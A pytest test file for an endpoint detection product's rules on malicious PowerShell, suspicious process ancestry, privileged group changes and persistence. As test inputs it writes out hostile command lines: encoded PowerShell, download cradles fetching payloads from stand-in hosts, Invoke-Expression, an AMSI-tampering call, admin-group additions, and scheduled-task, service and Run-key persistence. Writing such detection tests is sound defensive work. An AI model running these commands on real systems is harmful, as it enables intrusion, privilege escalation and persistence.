"""PowerShell, process relationships, privilege and persistence rules."""

import pytest

from app.models.enums import Severity
from tests.detection.helpers import from_raw, proc, rec, run

EXEC, PROC, PRIV, PERS = "AEGIS-EXEC-001", "AEGIS-PROC-001", "AEGIS-PRIV-001", "AEGIS-PERS-001"
B64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi"


# --- AEGIS-EXEC-001 ---------------------------------------------------------


@pytest.mark.parametrize(
    ("command", "indicator"),
    [
        (f"powershell.exe -enc {B64}", "encoded_command"),
        (f"powershell.exe -EncodedCommand {B64}", "encoded_command"),
        (f"powershell -e {B64}", "encoded_command"),
        ("powershell [Convert]::FromBase64String($x)", "base64_decode"),
        (
            "powershell (New-Object Net.WebClient).DownloadFile('http://x/a','a.exe')",
            "download_cradle",
        ),
        ("powershell iwr http://203.0.113.5/a.ps1 -OutFile a.ps1", "download_cradle"),
        ("powershell IEX $payload", "invoke_expression"),
        ("powershell $s | iex", "invoke_expression"),
        ('powershell -c "Invoke-Expression($code)"', "invoke_expression"),
        ("powershell -WindowStyle Hidden -File a.ps1", "hidden_window"),
        ("powershell -w h -File a.ps1", "hidden_window"),
        ("powershell -ExecutionPolicy Bypass -File a.ps1", "execution_policy_bypass"),
        ("powershell -ep unrestricted -File a.ps1", "execution_policy_bypass"),
        (
            "powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
            "amsi_tampering",
        ),
    ],
)
def test_each_powershell_indicator(command: str, indicator: str) -> None:
    findings = run(EXEC, [proc(command)])

    assert len(findings) == 1
    assert indicator in findings[0].title


@pytest.mark.parametrize(
    "command",
    [
        "powershell.exe -NoProfile -Command Get-Service",
        "powershell.exe -ExecutionPolicy RemoteSigned -File C:\\Scripts\\inventory.ps1",
        "powershell.exe -ExecutionPolicy Bypass",  # value only: no -e <base64> confusion
        'powershell.exe -Command "Get-Content C:\\iex-report.txt"',  # 'iex' inside a word
        "powershell.exe -e short",  # too short to be an encoded command
    ],
)
def test_ordinary_powershell_is_not_reported(command: str) -> None:
    findings = run(EXEC, [proc(command)])
    # "-ExecutionPolicy Bypass" alone is an indicator; everything else must be silent.
    if "Bypass" in command:
        assert [f.title for f in findings] and "encoded_command" not in findings[0].title
    else:
        assert findings == []


def test_suspicious_text_in_a_non_powershell_process_is_ignored() -> None:
    assert run(EXEC, [proc(f"cmd.exe /c echo -enc {B64}", process="cmd.exe")]) == []


def test_severity_and_mitre_follow_the_indicators() -> None:
    one = run(EXEC, [proc("powershell IEX $x")])[0]
    two = run(EXEC, [proc(f"powershell -w hidden -enc {B64}")])[0]

    assert one.severity is Severity.MEDIUM and one.mitre_ids == ("T1059.001",)
    assert two.severity is Severity.HIGH and two.mitre_ids == ("T1059.001", "T1027.010")


def test_min_indicators_parameter() -> None:
    assert run(EXEC, [proc("powershell IEX $x")], min_indicators=2) == []


def test_missing_command_line_is_not_reported() -> None:
    event = rec("process_creation", process_name="powershell.exe")
    assert run(EXEC, [event]) == []


# --- AEGIS-PROC-001 ---------------------------------------------------------


def test_office_spawning_a_shell() -> None:
    finding = run(PROC, [proc("cmd /c whoami", process="cmd.exe", parent="winword.exe")])[0]

    assert finding.mitre_ids == ("T1204.002",)


def test_web_server_spawning_a_shell() -> None:
    finding = run(PROC, [proc("powershell -c dir", parent="w3wp.exe")])[0]

    assert finding.mitre_ids == ("T1505.003",)


def test_masquerading_system_binary() -> None:
    raw = {
        "timestamp": "2026-10-08T09:00:00Z",
        "event_source": "sysmon",
        "event_type": "process_creation",
        "Image": "C:\\Users\\Public\\svchost.exe",
        "ParentImage": "C:\\Windows\\explorer.exe",
    }
    finding = run(PROC, [from_raw(raw)])[0]

    assert finding.mitre_ids == ("T1036.005",)
    assert finding.conditions[0].observed == "C:\\Users\\Public\\svchost.exe"


@pytest.mark.parametrize(
    "image",
    [
        "C:\\Windows\\System32\\svchost.exe",
        "c:/windows/syswow64/svchost.exe",
        "C:\\Windows\\explorer.exe",
    ],
)
def test_system_binaries_in_their_normal_folder_are_fine(image: str) -> None:
    raw = {"timestamp": 0, "event_source": "s", "event_type": "process_creation", "Image": image}
    assert run(PROC, [from_raw(raw)]) == []


def test_masquerading_check_needs_the_path_and_can_be_disabled() -> None:
    no_path = proc("svchost.exe -k x", process="svchost.exe")
    with_path = from_raw(
        {"timestamp": 0, "event_source": "s", "event_type": "process_creation",
         "Image": "D:\\tmp\\lsass.exe"}
    )  # fmt: skip

    assert run(PROC, [no_path]) == []
    assert run(PROC, [with_path], check_masquerading=False) == []


@pytest.mark.parametrize(
    ("child", "parent"),
    [("winword.exe", "explorer.exe"), ("notepad.exe", "winword.exe"), ("cmd.exe", "explorer.exe")],
)
def test_normal_relationships_are_not_reported(child: str, parent: str) -> None:
    assert run(PROC, [proc("x", process=child, parent=parent)]) == []


# --- AEGIS-PRIV-001 ---------------------------------------------------------


def test_event_adding_member_to_privileged_group() -> None:
    event = rec(
        "group_membership_change",
        windows_event_id=4732,
        username="p.novak",
        extra={"group_name": "Administrators", "member_name": "svc_tmp"},
    )
    finding = run(PRIV, [event])[0]

    assert finding.mitre_ids == ("T1098.007",)
    assert "svc_tmp added to 'Administrators' by p.novak" in finding.conditions[0].observed


def test_windows_event_id_alone_identifies_group_change() -> None:
    event = rec("other", windows_event_id=4728, extra={"group_name": "Domain Admins"})
    assert len(run(PRIV, [event])) == 1


def test_non_privileged_group_is_ignored() -> None:
    event = rec("group_membership_change", extra={"group_name": "Finance-Readers"})
    assert run(PRIV, [event]) == []


@pytest.mark.parametrize(
    "command",
    [
        "net localgroup administrators helpdesk /add",
        'net group "Domain Admins" eve /add /domain',
        "net1.exe localgroup Administrators bob /add",
        'Add-LocalGroupMember -Group "Administrators" -Member bob',
        "Add-ADGroupMember -Identity 'Domain Admins' -Members eve",
    ],
)
def test_command_lines_adding_to_privileged_groups(command: str) -> None:
    assert len(run(PRIV, [proc(command, process="net.exe")])) == 1


@pytest.mark.parametrize(
    "command",
    [
        "net localgroup administrators",
        "net localgroup administrators bob /delete",
        "net localgroup users bob /add",
    ],
)
def test_other_group_commands_are_ignored(command: str) -> None:
    assert run(PRIV, [proc(command, process="net.exe")]) == []


def test_privileged_groups_are_configurable() -> None:
    event = rec("group_membership_change", extra={"group_name": "Administratoren"})

    assert run(PRIV, [event]) == []
    assert len(run(PRIV, [event], privileged_groups=["Administratoren"])) == 1


# --- AEGIS-PERS-001 ---------------------------------------------------------


@pytest.mark.parametrize(
    ("event", "mitre"),
    [
        (rec("scheduled_task_created", extra={"task_name": "\\Updater"}), "T1053.005"),
        (rec("other", windows_event_id=4698), "T1053.005"),
        (rec("service_installed", extra={"service_name": "Evil"}), "T1543.003"),
        (rec("other", windows_event_id=7045), "T1543.003"),
        (
            rec(
                "registry_modification",
                extra={
                    "TargetObject": "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\x"
                },
            ),
            "T1547.001",
        ),
        (
            rec(
                "registry_modification",
                extra={
                    "registry_key": "HKLM\\Software\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\y"
                },
            ),
            "T1547.001",
        ),
        (proc("schtasks /create /tn x /tr y.exe /sc daily", process="schtasks.exe"), "T1053.005"),
        (proc("sc.exe create Updater binPath= C:\\u.exe", process="sc.exe"), "T1543.003"),
        (
            proc(
                'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v u /d u.exe',
                process="reg.exe",
            ),
            "T1547.001",
        ),
    ],
)
def test_persistence_mechanisms(event: object, mitre: str) -> None:
    findings = run(PERS, [event])  # type: ignore[list-item]

    assert len(findings) == 1
    assert findings[0].mitre_ids == (mitre,)


@pytest.mark.parametrize(
    "event",
    [
        rec(
            "registry_modification",
            extra={"registry_key": "HKCU\\Software\\Microsoft\\Office\\16.0"},
        ),
        rec(
            "registry_modification",
            extra={"registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunMRU"},
        ),
        rec("registry_modification"),  # no key recorded
        proc("schtasks /query /fo LIST", process="schtasks.exe"),
        proc("sc query Updater", process="sc.exe"),
    ],
)
def test_non_persistence_activity_is_ignored(event: object) -> None:
    assert run(PERS, [event]) == []  # type: ignore[list-item]


@pytest.mark.parametrize("operation", ["DeleteValue", "DeleteKey"])
def test_removing_a_run_key_is_not_persistence(operation: str) -> None:
    # Regression (rule v2): found by the evaluation suite, case pers-run-key-removed.
    key = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OldTool"
    deleted = rec("registry_modification", extra={"registry_key": key, "operation": operation})
    created = rec("registry_modification", extra={"registry_key": key, "EventType": "SetValue"})

    assert run(PERS, [deleted]) == []
    assert len(run(PERS, [created])) == 1


def test_allowed_names_suppress_known_good_services() -> None:
    event = rec("service_installed", extra={"service_name": "CorpBackupAgent"})

    assert len(run(PERS, [event])) == 1
    assert run(PERS, [event], allowed_names=["corpbackupagent"]) == []


def test_command_line_checks_can_be_disabled() -> None:
    event = proc("schtasks /create /tn x", process="schtasks.exe")
    assert run(PERS, [event], include_command_line=False) == []
